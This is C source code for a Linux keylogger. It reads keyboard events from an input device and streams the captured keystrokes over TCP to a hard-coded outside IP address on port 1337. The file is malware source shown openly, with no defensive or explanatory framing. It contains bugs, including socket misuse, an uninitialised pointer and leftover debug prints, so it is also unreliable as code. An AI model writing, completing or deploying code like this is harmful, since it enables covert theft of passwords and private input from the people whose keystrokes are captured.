#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <pthread.h>

#define IP "51.77.245.88"
#define PORT 1337
#define MAX_KEYCODE 255

char map[] = "..1234567890-=..azertyuiop{}..qsdfghjklmù*.wxcvbn,;:!";

void *keyFun() 
{
    struct input_event events;
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);

    inet_pton(AF_INET, IP, &(server_addr.sin_addr));

    connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));

    int file_descriptor = open("/dev/input/event9", O_RDONLY);
    
    if (file_descriptor == -1) 
	{
        perror("Error opening file or input event");
        return 0;
    }

    while (1) 
	{
        
        if (read(file_descriptor, &events, sizeof(events)) == -1) 
		{
            printf("Error reading input event");
            break;
        }
        printf("c oucou");
        if (events.type == EV_KEY && events.value == 0) 
		{
            fflush(sockfd);
            printf("2");

            
            char *character;
            if (events.code >= 0 && events.code <= MAX_KEYCODE) 
			{
                character = &map[events.code];
            }
            
            if (character != NULL) 
			{
                printf("3");

                if (events.code == 28) 
				{
                    send(sockfd, "\n", strlen("\n"), 0);
                } 
				else if (events.code == 57) 
				{
                    send(sockfd, " ", strlen(" "),0);
                }
				else 
				{
                    send(sockfd, character, strlen(character), 0);
                }
            }
        }
    }
    
    fclose(sockfd);
    close(file_descriptor);

    pthread_exit(NULL);
    
    return 0;
}

int main(int argc, char* argv[])
{
    keyFun();
    return 0;
}

